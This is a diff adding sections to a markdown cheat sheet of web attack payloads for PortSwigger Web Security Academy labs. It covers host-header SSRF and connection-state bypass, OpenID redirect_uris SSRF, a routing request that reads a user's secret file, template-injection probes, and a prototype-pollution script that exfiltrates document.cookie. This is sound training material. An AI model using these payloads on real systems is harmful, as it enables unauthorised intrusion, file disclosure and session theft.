@@ -129,9 +129,7 @@ body:document.cookie
 
 ## Host Header Poison - forgot-password
 
-### Authentication
-
-### Spoof IP Address
+### Spoof IP Address  
 
 >Identify that the alternate HOST headers are supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection or redirection attacks to do password reset poisoning.  
   
@@ -146,6 +144,34 @@ X-Forwarded-Server: EXPLOIT-SERVER-ID.exploit-server.net
 ![Exploit Server Logs capture the forgot password reset token](HOST-Header-forgot-password-reset.PNG)  
 
 [PortSwigger Lab: Password reset poisoning via middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)  
+
+### HOST Connection State
+
+>Sending grouped request in sequence using single connection and setting the connection header to keep-alive, bypass host header validation and enable SSRF exploit of local server.  
+
+```html
+GET /intranet/service HTTP/1.1
+Host: TARGET.web-security-academy.net
+Cookie: session=vXAA9EM1hzQuJwHftcLHKxyZKtSf2xCW
+Content-Length: 48
+Content-Type: text/plain;charset=UTF-8
+Connection: keep-alive
+```  
+
+<sub>Next request is the second tab in group sequence of requests</sub>  
+
+```html
+POST /service/intranet HTTP/1.1
+Host: localhost
+Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE
+Content-Type: x-www-form-urlencoded
+Content-Length: CORRECT
+
+csrf=YOUR-CSRF-TOKEN&username=carlos
+```  
+
+[Lab: Host validation bypass via connection state attack](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack)  
+
 
 ## HTTP Request Smuggling
 
@@ -419,9 +445,36 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 stockApi=http://localhost:6566/admin  
 
 http://127.1:6566/admin  
+```  
 
+### Absolute GET URL + HOST SSRF
 
-```
+>Possible to provide an absolute URL in the request line GET request and then supply different target for the HOST header.  
+
+[PortSwigger Lab: SSRF via flawed request parsing](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing)  
+
+```html
+GET https://YOUR-LAB-ID.web-security-academy.net/
+Host: COLLABORATOR.DOMAIN
+```  
+
+### SSRF redirect_uris  
+
+>POST request to register data to the clien application with redirect URL endpoint in JSON body. Provide a redirect_uris array containing an arbitrary whitelist of callback URIs.  
+
+[PortSwigger Lab: SSRF via OpenID dynamic client registration](https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration)  
+
+```json
+POST /reg HTTP/1.1
+Host: TARGET.web-security-academy.net
+Content-Type: application/json
+
+{
+    "redirect_uris" : [
+        "http://localhost:6566"
+    ]
+}
+```  
 
 ### XXE + SSRF
 
@@ -431,8 +484,21 @@ http://127.1:6566/admin
 
 ```xml
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://localhost:6566/"> ]>  
-
 ```  
+
+
+### HOST header routing-based  
+
+>Routing-based SSRF via the Host header allow the exploit to access an localhost intranet service.  
+
+[PortSwigger Lab: Routing-based SSRF](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf)  
+
+```html
+GET /service/intranet?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&readfile=/home/carlos/secret HTTP/1.1
+Host: localhost
+```  
+
+<sub>**Note:** Convert the GET request to POST</sub>  
 
 ### HTML to PDF 
 
@@ -455,10 +521,9 @@ http://127.1:6566/admin
   </script>
  </body>
 </html>
+```  
 
-```
-
->Random notes on HTML-to-PDF converters  
+>Random notes on HTML-to-PDF converters & SSRF  
 
 ```
 "Download report as PDF"
@@ -470,7 +535,7 @@ pdf creator: wkhtmltopdf 0.12.5
 hacktricks xss cross site scripting server side xss dynamic pdf 
 ```  
 
-<sup> SSRF Section incomplete </sup>  
+<sup> SSRF Section incomplete due to insuffiecient testing...</sup>  
 
 
 ## SSTI - Server Side Template Injection
@@ -480,6 +545,10 @@ hacktricks xss cross site scripting server side xss dynamic pdf
 <sub>SSTI exploit samples</sub>
 
 ```html
+{{fuzzer}}
+${fuzzer}
+${{fuzzer}}
+
 blog-post-author-display=user.name}}{{7*7}} 
 
 ${7*7}
@@ -491,7 +560,6 @@ ${{<%[%'"}}%\.
 {% debug %}
 
 {% SkippyPeanut %}
-
 ```
 
 ```python
@@ -518,4 +586,20 @@ portswigger.net/research/server-side-template-injection
 portswigger.net/research/template-injection
 ```  
 
-<sup> SSTI Section incomplete </sup>  
+<sup> SSTI Section incomplete as it required practical proof and screenshot evidence of practice...</sup>  
+
+
+## ProtoType Pollution  
+
+>A target is vulnerable to DOM XSS via client side prototype pollution. **DOM Invader** will identify the gadget and using hosted payload to phish a victim and steal their cookie.  
+
+<sub>Exploit server Body section, host an exploit that will navigate the victim to a malicious URL</sub>
+
+```html
+<script>
+    location="https://TARGET.web.net/#__proto__[hitCallback]=alert%28document.cookie%29"
+</script>  
+```  
+
+[PortSwigger Lab: Client-side prototype pollution in third-party libraries](https://portswigger.net/web-security/prototype-pollution/finding/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries)
+
